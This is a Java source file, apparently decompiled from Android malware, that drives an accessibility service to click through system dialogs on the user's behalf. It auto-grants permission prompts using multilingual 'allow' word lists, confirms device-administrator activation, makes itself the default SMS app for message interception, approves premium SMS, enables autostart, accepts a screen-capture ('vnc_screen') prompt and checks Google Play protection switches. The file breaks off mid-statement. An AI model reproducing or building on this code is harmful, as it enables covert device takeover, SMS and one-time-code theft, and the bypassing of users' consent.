package fddo;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sonnokta.p023w;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

/* renamed from: fddo.else  reason: invalid class name */
public class Celse extends Ctry {
    private static String TAG = "bwolf-Celse";

    /* renamed from: super  reason: not valid java name */
    private static final String f48super = Cbreak.fddo("00fcf94b25");

    /* renamed from: break  reason: not valid java name */
    String f49break = "allow|Zezwalaj|zezwól|Autoriser|yes|tak|oui|yes|tak|CONSENTI|permitir|Zulassen|允许";

    /* renamed from: catch  reason: not valid java name */
    String f50catch = "activate|activer|Uaktywnij|aktywuj|Włącz tego|Attiva|activar";

    /* renamed from: class  reason: not valid java name */
    String f51class = "as default|ok|yes|change|modifier|oui|tak|zmień|SÌ|sí";

    /* renamed from: const  reason: not valid java name */
    String f52const = "ok|uninstall|aceptar|desinstalar";

    /* renamed from: final  reason: not valid java name */
    String f53final = "cancelar|cancel|deny";

    public Celse(Context context, p023w p023w, String str, String str2, boolean z) {
        super(context, p023w, str, str2, z);
    }

    /* renamed from: break  reason: not valid java name */

    /**
     * TODO - CHECK
     *
     * @param r20
     * @return
     */
    public boolean m85break(java.lang.String r20) {
        Log.e(TAG, "--- m85break > Check --- " + r20);

        String strV1 = r20;
        boolean boolV2 = this.m163for();
        boolean boolV3 = false;

        if (!boolV2)
            return boolV3;

        int intV4 = 0x2;
        String strV5 = "widget.Button";
        boolean boolV6 = true;
        int intV2, intV14 = 0x3;

        String strV2 = "uninstall_confirm";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            p023w p023wV1 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV1 = p023wV1.getRootInActiveWindow();
            strV2 = this.f52const;
            String strV7 = "android.widget.Button";
            accessibilityNodeInfoV1 = fddo.m97static(accessibilityNodeInfoV1, strV7, strV2, boolV6);
            if (accessibilityNodeInfoV1 != null) {
                boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV1)
                    return boolV6;
            }

            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();

            if (intV2 == intV4) {
                intV2 = listV1.size();
                intV2 -= 1;
                accessibilityNodeInfoV1 = (AccessibilityNodeInfo) listV1.get(intV2);
                boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV1)
                    return boolV6;
            }

            return boolV3;
        }

        strV2 = "short_sms";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 != intV4)
                return boolV3;

            p023w p023wV2 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV2 = p023wV2.m20this();
            String strV4 = "sms_short_code_remember";
            accessibilityNodeInfoV2 = fddo.m90else(accessibilityNodeInfoV2, strV4);

            if (accessibilityNodeInfoV2 != null) {
                boolean boolV4 = accessibilityNodeInfoV2.isChecked();
                if (!boolV4) {
                    fddo.ifdf(accessibilityNodeInfoV2);
                }
            }

            Object objV2 = listV1.get(0);
            accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
            strV4 = this.f53final;
            strV5 = "/permission_deny_button";
            boolean boolV4 = this.ifdf(accessibilityNodeInfoV2, strV5, strV4);
            strV5 = this.f53final;
            String strV7 = "/button2";
            boolV2 = this.ifdf(accessibilityNodeInfoV2, strV7, strV5);
            if (boolV2) {
                boolV4 = boolV6;
            }

            Object objV1 = listV1.get(boolV4 ? 1 : 0);
            AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
            boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
            if (boolV1) {
                return boolV6;
            }

            return boolV3;
        }

        strV2 = "push_admin";
        boolV2 = strV1.equals(strV2);
        String strV7 = "(";
        int intV8 = 0xf;
        String strV9 = "";
        String strV10 = "startsWith";
        String strV11 = "android.widget.TextView";
        String strV12 = "widget.TextView";
        String strV13 = "widget.Switch";

        if (boolV2) {
            Context contextV1 = this.ifdf;
            strV1 = Cgoto.m137throw(contextV1, intV8);
            boolV2 = this.m162else();
            if (boolV2) {
                boolV2 = Cgoto.spdghmpamghpsdfmgh();
                String strV8 = " ";
                String strV14 = "\u00a0";
                String strV15 = "android:id/title";
                long longV16 = 0x3e8;
                if (boolV2) {
                    List listV2 = this.m165new(strV13);
                    intV4 = listV2.size();
                    if (intV4 == 1) {
                        Object objV2 = listV2.get(0);
                        AccessibilityNodeInfo accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                        boolV2 = fddo.ifdf(accessibilityNodeInfoV2);
                        if (boolV2) {
                            Cgoto.p(longV16);
                        }
                    }

                    listV2 = this.m165new(strV12);
                    Iterator iteratorV2 = listV2.iterator();

                    boolean boolV4;
                    while (iteratorV2.hasNext()) {
                        Object objV4 = iteratorV2.next();
                        AccessibilityNodeInfo accessibilityNodeInfoV4 = (AccessibilityNodeInfo) objV4;
                        strV5 = accessibilityNodeInfoV4.getViewIdResourceName();
                        if (strV5 != null) {
                            strV5 = accessibilityNodeInfoV4.getViewIdResourceName();
                            boolean boolV5 = strV5.equals(strV15);
                            if (boolV5) {
                                CharSequence charSequenceV5 = accessibilityNodeInfoV4.getText();
                                if (charSequenceV5 != null) {
                                    charSequenceV5 = accessibilityNodeInfoV4.getText();
                                    strV5 = charSequenceV5.toString();
                                    strV5 = strV5.toLowerCase();
                                    strV5 = strV5.replace(strV14, strV8);
                                } else
                                    strV5 = strV9;

                                Locale localeV6 = Locale.ROOT;
                                String strV6 = strV1.toLowerCase(localeV6);
                                boolV5 = strV5.startsWith(strV6);
                                if (boolV5) {
                                    boolV4 = fddo.ifdf(accessibilityNodeInfoV4);
                                    if (boolV4) {
                                        Cgoto.p(longV16);
                                    }
                                }
                            }
                        }
                    }

                    return boolV3;
                }

                boolV2 = Cgoto.spdghmpamghpsdfmgh();
                if (boolV2)
                    return boolV3;

                List listV2 = this.m165new(strV13);
                int intV13 = listV2.size();

                AccessibilityNodeInfo accessibilityNodeInfoV1 = null;   // TODO?
                if (intV13 == 1) {
                    Object objV1 = listV2.get(0);
                    accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                } else {
                    p023w p023wV13 = this.f85this;
                    AccessibilityNodeInfo accessibilityNodeInfoV13 = p023wV13.m20this();
                    AccessibilityNodeInfo accessibilityNodeInfoV10 = fddo.m96return(accessibilityNodeInfoV13, strV11, strV1, strV10);
                    List listV11 = this.m165new(strV12);
                    ArrayList arrayListV12 = new ArrayList();
                    Iterator iteratorV11 = listV11.iterator();

                    while (iteratorV11.hasNext()) {
                        Object objV13 = iteratorV11.next();
                        accessibilityNodeInfoV13 = (AccessibilityNodeInfo) objV13;
                        String strV18 = accessibilityNodeInfoV13.getViewIdResourceName();
                        if (strV18 != null) {
                            String strV3 = accessibilityNodeInfoV13.getViewIdResourceName();
                            boolV3 = strV3.equals(strV15);
                            if (boolV3) {
                                arrayListV12.add(accessibilityNodeInfoV13);
                            }
                        }

                        boolV3 = false;
                    }

                    int intV3 = arrayListV12.size();
                    int intV11 = listV2.size();
                    if (intV3 == intV11) {
                        Iterator iteratorV3 = arrayListV12.iterator();
                        intV11 = 0;

                        while (iteratorV3.hasNext()) {
                            Object objV12 = iteratorV3.next();
                            AccessibilityNodeInfo accessibilityNodeInfoV12 = (AccessibilityNodeInfo) objV12;
                            CharSequence charSequenceV13 = accessibilityNodeInfoV12.getText();
                            if (charSequenceV13 != null) {
                                CharSequence charSequenceV12 = accessibilityNodeInfoV12.getText();
                                strV12 = charSequenceV12.toString();
                                strV12 = strV12.toLowerCase();
                                strV12 = strV12.replace(strV14, strV8);
                            } else {
                                strV12 = strV9;
                            }

                            Locale localeV13 = Locale.ROOT;
                            strV13 = strV1.toLowerCase(localeV13);
                            boolean boolV12 = strV12.startsWith(strV13);
                            if (boolV12) {
                                Object objV1 = listV2.get(intV11);
                                accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                                break;
                            }

                            intV11++;
                        }
                    } else {
                        accessibilityNodeInfoV1 = accessibilityNodeInfoV10;
                    }
                }

                boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV1) {
                    Cgoto.p(longV16);
                    contextV1 = this.ifdf;
                    Boolean booleanV1 = Cgoto.ifdf(contextV1);
                    boolV1 = booleanV1.booleanValue();
                    Log.e(TAG, "--- mm85break - push_admin > Check --- boolV1: " + boolV1);
//                    if (boolV1) {
                    fddo fddoV1 = this.f84new;
                    fddoV1.fddo();
                    return boolV6;
//                    }
                }
            }

            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 == intV4) {
                intV2 = 0;
                Object objV3 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                Object objV1 = listV1.get(1);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                CharSequence charSequenceV2 = accessibilityNodeInfoV3.getText();
                if (charSequenceV2 != null) {
                    charSequenceV2 = accessibilityNodeInfoV3.getText();
                    strV2 = charSequenceV2.toString();
                    boolV2 = strV2.contains(strV7);
                    if (boolV2) {
                        return false;
                    }

                    strV2 = this.f49break;
                    String strV4 = "/allow_button";
                    boolV2 = this.ifdf(accessibilityNodeInfoV3, strV4, strV2);
                    if (boolV2) {
                        boolV2 = fddo.ifdf(accessibilityNodeInfoV3);
                        if (boolV2) {
                            return boolV6;
                        }
                    }

                    strV2 = this.f53final;
                    strV4 = "/intercept_warn_deny";
                    boolV2 = this.ifdf(accessibilityNodeInfoV1, strV4, strV2);
                    if (!boolV2) {
                        strV2 = "/intercept_warn_allow";
                        boolV2 = this.ifdf(accessibilityNodeInfoV3, strV2, strV9);
                        if (!boolV2) {
                            boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                            if (boolV1) {
                                return boolV6;
                            } else {
                                return false;
                            }
                        }
                    }

                    boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV1) {
                        return boolV6;
                    }
                }
            }

            return false;
        }

        strV2 = "xiaomi_autostart";
        boolV2 = strV1.equals(strV2);
        String strV3 = "MANPERMS";
        if (boolV2) {
            strV1 = Cfor.ifdf;
            boolean boolV1 = strV1.contains(strV3);
            strV2 = "auto_start_type";
            if (boolV1) {
                p023w p023wV1 = this.f85this;
                AccessibilityNodeInfo accessibilityNodeInfoV1 = p023wV1.m20this();
                accessibilityNodeInfoV1 = fddo.m90else(accessibilityNodeInfoV1, strV2);
                boolV1 = accessibilityNodeInfoV1.isChecked();

                if (boolV1) {
                    return boolV6;
                } else {
                    return false;
                }
            }

            int intV1 = 0x0;
            List listV3 = this.m165new(strV5);
            p023w p023wV4 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV4 = p023wV4.m20this();
            strV5 = "alertTitle";
            accessibilityNodeInfoV4 = fddo.m90else(accessibilityNodeInfoV4, strV5);
            if (accessibilityNodeInfoV4 != null) {
                intV4 = listV3.size();
                if (intV4 == 1) {
                    Object objV3 = listV3.get(intV1);
                    AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                    boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV3)
                        return false;
                }
            }

            p023w p023wV1 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV1 = p023wV1.m20this();
            accessibilityNodeInfoV1 = fddo.m90else(accessibilityNodeInfoV1, strV2);
            boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
            if (boolV1)
                return boolV6;

            Context contextV1 = this.ifdf;
            strV1 = Cgoto.m137throw(contextV1, intV8);
            p023w p023wV2 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV2 = p023wV2.m20this();
            accessibilityNodeInfoV1 = fddo.m96return(accessibilityNodeInfoV2, strV11, strV1, strV10);
            fddo.ifdf(accessibilityNodeInfoV2);

            return false;
        }

        intV2 = 0x0;
        String strV14 = "battery_confirm";
        boolean boolV14 = strV1.equals(strV14);
        String strV15 = "/button1";
        intV8 = 0x4;
        if (boolV14) {
            strV1 = "widget.RadioButton";
            List listV1 = this.m165new(strV1);
            int intV3 = listV1.size();
            if (intV3 == intV8) {
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                fddo.ifdf(accessibilityNodeInfoV1);
                return boolV6;
            }

            listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 == intV4) {
                Iterator iteratorV2 = listV1.iterator();
//                cond_23
                while (iteratorV2.hasNext()) {
                    Object objV3 = iteratorV2.next();
                    AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                    String strV4 = this.f49break;
                    boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV15, strV4);
                    if (boolV4) {
                        boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                        if (boolV3)
                            return boolV6;
                    }
                }

                intV2 = listV1.size();
                intV2 -= 1;
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV1)
                    return boolV6;
            }

            return false;
        }

        strV2 = "devadmin_uninstall";
        boolV2 = strV1.equals(strV2);
        intV14 = 0x3;
        if (boolV2) {
            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 != intV14) {
                return false;
            }

            Iterator iteratorV2 = listV1.iterator();
            while (iteratorV2.hasNext()) {
                Object objV3 = iteratorV2.next();
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                String strV4 = this.f52const;
                strV5 = "/uninstall_button";
                boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV5, strV4);
                if (boolV4) {
                    boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV3)
                        return boolV6;
                }
            }

            intV2 = listV1.size();
            if (intV2 == intV14) {
                intV2 = 1;
            } else
                intV2 = 0;

            Object objV1 = listV1.get(intV2);
            AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
            boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
            if (!boolV1)
                return boolV6;

            return false;
        }

        intV2 = 0x0;
        String strV8 = "devadmin_confirm";
        boolean boolV8 = strV1.equals(strV8);
        if (boolV8) {
            List listV1 = this.m165new(strV5);
            boolV3 = listV1.isEmpty();
            if (boolV3) {
                return false;
            }

            Iterator iteratorV2 = listV1.iterator();
            while (iteratorV2.hasNext()) {
                Object objV3 = iteratorV2.next();
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                StringBuilder stringBuilderV5 = new StringBuilder();
                stringBuilderV5.append(strV9);
                strV7 = "ADMIN_BUTTON: ";
                stringBuilderV5.append(strV7);
                Cconst.m65for(accessibilityNodeInfoV3);
                strV3 = "\n";
                stringBuilderV5.append(strV3);
                strV9 = stringBuilderV5.toString();
            }

            Context contextV2 = this.ifdf;
            Cgoto.g(contextV2, strV9);
            boolV2 = Cgoto.grethwjrsfhj();
            if (boolV2) {
                intV2 = listV1.size();
                if (intV2 == intV14) {
                    iteratorV2 = listV1.iterator();
//                    goto_c
                    while (iteratorV2.hasNext()) {
                        Object objV3 = iteratorV2.next();
                        AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                        String strV4 = this.f50catch;
                        strV5 = "/action_button";
                        boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV5, strV4);
                        if (boolV4) {
                            boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                            if (boolV3) {
                                return false;
                            }
                        }

                        boolV3 = false;
                    }

                    int intV3 = 0x0;
                    Object objV1 = listV1.get(intV3);
                    AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                    fddo.ifdf(accessibilityNodeInfoV1);
                    return boolV3;
                }

                intV2 = listV1.size();
                if (intV2 == intV4) {
                    iteratorV2 = listV1.iterator();
                    while (iteratorV2.hasNext()) {
                        Object objV3 = iteratorV2.next();
                        AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                        String strV4 = "/accept";
                        strV5 = "Next";
                        boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV4, strV5);
                        if (boolV4) {
                            boolV4 = fddo.ifdf(accessibilityNodeInfoV3);
                            if (boolV4) {
                                Context contextV1 = this.ifdf;
                                StringBuilder stringBuilderV2 = new StringBuilder();
                                strV4 = "ADMIN_BUTTON_CLICKED 1: ";
                                stringBuilderV2.append(strV4);
                                strV3 = Cconst.m65for(accessibilityNodeInfoV3);
                                stringBuilderV2.append(strV3);
                                strV2 = stringBuilderV2.toString();
                                Cgoto.g(contextV1, strV2);
                                return boolV6;
                            }
                        }
                    }

                    int intV3 = 0x0;
                    Object objV2 = listV1.get(intV3);
                    AccessibilityNodeInfo accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                    CharSequence charSequenceV4 = accessibilityNodeInfoV2.getText();
                    strV5 = "Cancel";
                    boolean boolV4 = charSequenceV4.equals(strV5);
                    if (boolV4) {
                        Object objV1 = listV1.get(intV3);
                        objV2 = objV1;
                        accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                    }

                    boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV2);
                    if (boolV1) {
                        Context contextV1 = this.ifdf;
                        StringBuilder stringBuilderV3 = new StringBuilder();
                        String strV4 = "ADMIN_BUTTON_CLICKED 2: ";
                        stringBuilderV3.append(strV4);
                        strV2 = Cconst.m65for(accessibilityNodeInfoV2);
                        stringBuilderV3.append(strV2);
                        strV2 = stringBuilderV3.toString();
                        Cgoto.g(contextV1, strV2);
                        return boolV6;
                    }
                }
                return false;
            }

            intV2 = listV1.size();
            if (intV2 != intV14) {
                intV2 = listV1.size();
                if (intV2 == intV4) {
                    return false;
                }
            }

            iteratorV2 = listV1.iterator();
            while (iteratorV2.hasNext()) {
                Object objV3 = iteratorV2.next();
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                String strV4 = this.f50catch;
                strV5 = "/action_button";
                boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV5, strV4);
                if (boolV4) {
                    boolV4 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV4) {
                        Context contextV1 = this.ifdf;
                        StringBuilder stringBuilderV2 = new StringBuilder();
                        strV4 = "ADMIN_BUTTON_CLICKED 3: ";
                        stringBuilderV2.append(strV4);
                        strV3 = Cconst.m65for(accessibilityNodeInfoV3);
                        stringBuilderV2.append(strV3);
                        strV2 = stringBuilderV2.toString();
                        Cgoto.g(contextV1, strV2);

                        return boolV6;
                    }
                }
            }

            int intV3 = 0x0;
            Object objV1 = listV1.get(intV3);
            AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
            boolV2 = fddo.ifdf(accessibilityNodeInfoV1);
            if (boolV2) {
                contextV2 = this.ifdf;
                StringBuilder stringBuilderV3 = new StringBuilder();
                String strV4 = "ADMIN_BUTTON_CLICKED FIRST: ";
                stringBuilderV3.append(strV4);
                strV1 = Cconst.m65for(accessibilityNodeInfoV1);
                stringBuilderV3.append(strV1);
                strV1 = stringBuilderV3.toString();
                Cgoto.g(contextV2, strV1);
                return boolV6;
            }
            return false;
        }

        strV2 = "sms_change";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            strV1 = this.m161case();
            strV2 = "SmsDefaultDialog";
            strV2 = strV2.toLowerCase();
            boolean boolV1 = strV1.contains(strV2);
            if (boolV1) {
                List listV1 = this.m165new(strV5);
                intV2 = listV1.size();
                if (intV2 == intV4) {
                    intV2 = listV1.size();
                    intV2 -= 1;
                    Object objV1 = listV1.get(intV2);
                    AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                    boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                    if (boolV1)
                        return boolV6;
                }
            }

            strV1 = p023w.f12else;
            strV1 = p023w.m8else(strV1);
            boolV1 = strV1.isEmpty();
            if (!boolV1) {
                Context contextV1 = this.ifdf;
                Boolean booleanV2 = Boolean.FALSE;
                strV3 = "intercept_on";
                Boolean booleanV1 = Cthrow.fddo(contextV1, strV3, booleanV2);
                boolV1 = booleanV1.booleanValue();
                StringBuilder stringBuilderV3 = new StringBuilder();
                Context contextV2 = this.ifdf;
                if (boolV1) {
                    contextV1 = this.ifdf;
                    intV2 = 0xf;
                    strV1 = Cgoto.m137throw(contextV1, intV2);
                    strV7 = "SMS_Intercept: enable title: ";
                } else {
                    contextV1 = this.ifdf;
                    strV2 = "4dafc67533dbfbf95023b43a";
                    strV2 = Cbreak.fddo(strV2);
                    strV1 = Cthrow.m158new(contextV1, strV2, strV9);
                    int intV3 = 0xa;
                    strV1 = Cgoto.m141volatile(contextV2, strV1, intV3);
                    strV7 = "SMS_Intercept: disable title: ";
                }

                stringBuilderV3.append(strV7);
                stringBuilderV3.append(strV1);
                strV3 = stringBuilderV3.toString();
                Cgoto.g(contextV2, strV3);
                boolV2 = strV1.isEmpty();

                if (!boolV2) {
                    p023w p023wV2 = this.f85this;
                    AccessibilityNodeInfo accessibilityNodeInfoV2 = p023wV2.m20this();
                    AccessibilityNodeInfo accessibilityNodeInfoV1 = fddo.m96return(accessibilityNodeInfoV2, strV11, strV1, strV10);
                    boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                    if (boolV1) {
                        contextV1 = this.ifdf;
                        strV2 = "SMS_Intercept: title clicked";
                    } else {
                        contextV1 = this.ifdf;
                        strV2 = "SMS_Intercept: title not found";
                    }
                } else {
                    contextV1 = this.ifdf;
                    strV2 = "SMS_Intercept: title is empty";
                }

                Cgoto.g(contextV1, strV2);
            }

            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 == intV4) {
                Iterator iteratorV2 = listV1.iterator();
                while (iteratorV2.hasNext()) {
                    Object objV3 = iteratorV2.next();
                    AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                    String strV4 = this.f51class;
                    boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV15, strV4);
                    if (boolV4) {
                        boolV4 = fddo.ifdf(accessibilityNodeInfoV3);
                        if (boolV4) {
                            Context contextV1 = this.ifdf;
                            StringBuilder stringBuilderV2 = new StringBuilder();
                            strV4 = "SMS_Intercept: confirm button clicked: ";
                            stringBuilderV2.append(strV4);
                            strV3 = accessibilityNodeInfoV3.toString();
                            stringBuilderV2.append(strV3);
                            strV2 = stringBuilderV2.toString();
                            Cgoto.g(contextV1, strV2);
                            return boolV6;
                        }
                    }
                }

                intV2 = listV1.size();
                intV2 -= 1;
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                boolV2 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV2) {
                    Context contextV2 = this.ifdf;
                    StringBuilder stringBuilderV3 = new StringBuilder();
                    String strV4 = "SMS_Intercept: LAST button clicked: ";
                    stringBuilderV3.append(strV4);
                    strV1 = accessibilityNodeInfoV1.toString();
                    stringBuilderV3.append(strV1);
                    strV1 = stringBuilderV3.toString();
                    Cgoto.g(contextV2, strV1);
                    return boolV6;
                }
            }

            return false;
        }

        strV2 = "perms_confirm";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 != intV4) {
                intV2 = listV1.size();
                if (intV2 != intV14) {
                    return false;
                }
            }

            Iterator iteratorV2 = listV1.iterator();
            while (iteratorV2.hasNext()) {
                Object objV3 = iteratorV2.next();
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                String strV4 = this.f49break;
                strV5 = "allow_button";
                boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV5, strV4);
                if (boolV4) {
                    boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV3)
                        return boolV6;
                }
            }

            intV2 = listV1.size();
            if (intV2 == intV14) {
                intV2 = 0;
            } else {
                intV2 = listV1.size();
                intV2 -= 1;
            }

            Context contextV3 = this.ifdf;
            strV3 = Cgoto.m138throws(contextV3);
            String strV4 = "de";
            boolean boolV4 = strV3.equals(strV4);
            if (!boolV4) {
                strV4 = "ru";
                boolV3 = strV3.equals(strV4);
                if (boolV3) {
                    intV2 = 0x0;
                }
            } else
                intV2 = 0x0;

            Object objV1 = listV1.get(intV2);
            AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
            boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
            if (boolV1) {
                return boolV6;
            }

            return boolV1;
        }

//        1881
        strV2 = "gp_page_settings";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            strV1 = "widget.ImageButton";
            intV2 = this.m167try(strV1);
            int intV3 = this.m167try(strV5);

            if (intV2 == 1 && intV3 == intV14)
                return true;

            List listV2 = this.m165new(strV12);
            intV3 = listV2.size();
            if (intV3 > 0) {
                Iterator iteratorV2 = listV2.iterator();
                intV3 = 0;
                while (iteratorV2.hasNext()) {
                    Object objV4 = iteratorV2.next();
                    AccessibilityNodeInfo accessibilityNodeInfoV4 = (AccessibilityNodeInfo) objV4;
                    boolean boolV4 = accessibilityNodeInfoV4.isClickable();
                    if (boolV4) {
                        continue;
                    }

                    intV3++;
                }
            } else
                intV3 = 0;

            int intV1 = this.m167try(strV1);
            intV2 = this.m167try(strV13);
            if (intV3 == 1 && intV1 == 1 && intV2 == 0)
                return boolV6;

            return false;
        }

        strV2 = "gp_enable_proposition";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            p023w p023wV1 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV1 = p023wV1.m20this();
            if (accessibilityNodeInfoV1 != null) {
                p023wV1 = this.f85this;
                accessibilityNodeInfoV1 = p023wV1.m20this();
                CharSequence charSequenceV1 = accessibilityNodeInfoV1.getPackageName();
                if (charSequenceV1 != null) {
                    p023wV1 = this.f85this;
                    accessibilityNodeInfoV1 = p023wV1.m20this();
                    charSequenceV1 = accessibilityNodeInfoV1.getPackageName();
                    strV2 = "com.android.vending";
                    boolean boolV1 = charSequenceV1.equals(strV2);
                    if (!boolV1)
                        return false;
                }
            }

            int intV1 = 0x0;
            strV2 = this.m161case();
            strV3 = "PerSourceInstallationConsentDialog";
            strV3 = strV3.toLowerCase();
            boolV2 = strV2.contains(strV3);
            if (boolV2)
                return false;

            boolean boolV1 = this.m164goto();
            if (boolV1) {
                intV1 = this.m167try(strV13);
                if (intV1 == 0) {
                    intV1 = this.m167try(strV5);
                    if (intV1 == intV4)
                        return boolV6;
                }
            }

            return false;
        }

        strV2 = "gp_switches_enabled";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            int intV1 = this.m167try(strV12);
            intV2 = this.m167try(strV13);
            int intV3 = this.m167try(strV5);
            int intV5 = 0x4;
            if (intV1 >= intV5) {
                if (intV2 == intV4) {
                    if (intV3 > 0)
                        return false;
                    else {
                        List listV1 = this.m165new(strV13);
                        Iterator iteratorV1 = listV1.iterator();

                        while (iteratorV1.hasNext()) {
                            Object objV2 = iteratorV1.next();
                            AccessibilityNodeInfo accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                            boolV3 = accessibilityNodeInfoV2.isCheckable();
                            if (boolV3) {
                                boolV2 = accessibilityNodeInfoV2.isChecked();
                                if (boolV2)
                                    return boolV6;
                            }
                        }

                        return false;
                    }
                }
            }

            return false;
        }

        strV2 = "gp_switches_disabled";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            int intV1 = this.m167try(strV12);
            intV2 = this.m167try(strV13);
            int intV3 = this.m167try(strV5);
            int intV5 = 0x4;

            if (intV1 >= intV5) {
                if (intV2 == intV4) {
                    if (intV3 <= 0) {
                        List listV1 = this.m165new(strV13);
                        Iterator iteratorV1 = listV1.iterator();
                        intV2 = 0x0;

                        while (iteratorV1.hasNext()) {
                            Object objV3 = iteratorV1.next();
                            AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                            boolean boolV5 = accessibilityNodeInfoV3.isCheckable();
                            if (boolV5) {
                                boolV3 = accessibilityNodeInfoV3.isChecked();
                                if (!boolV3)
                                    intV2++;
                            }
                        }

                        if (intV2 == intV4)
                            return boolV6;

                        return false;
                    }
                }
            }

            return false;
        }

        intV2 = 0x0;
        strV8 = "gp_page_ok";
        boolV8 = strV1.equals(strV8);
        if (boolV8) {
            int intV1 = this.m167try(strV12);
            int intV3 = this.m167try(strV5);
            if (intV1 >= 0) {
                if (intV3 == intV4)
                    return boolV6;
            }

            return false;
        }

        strV2 = "vnc_screen";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 == intV4) {
                intV2 = listV1.size();
                intV2 -= 1;
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                if (boolV1)
                    return boolV6;
            }

            return false;
        }

        strV2 = "write_settings";
        boolV2 = strV1.equals(strV2);
        strV8 = "widget.CheckBox";
        if (boolV2) {
            List listV1 = this.m165new(strV13);
            intV2 = listV1.size();
            if (intV2 == 0) {
                listV1 = this.m165new(strV8);
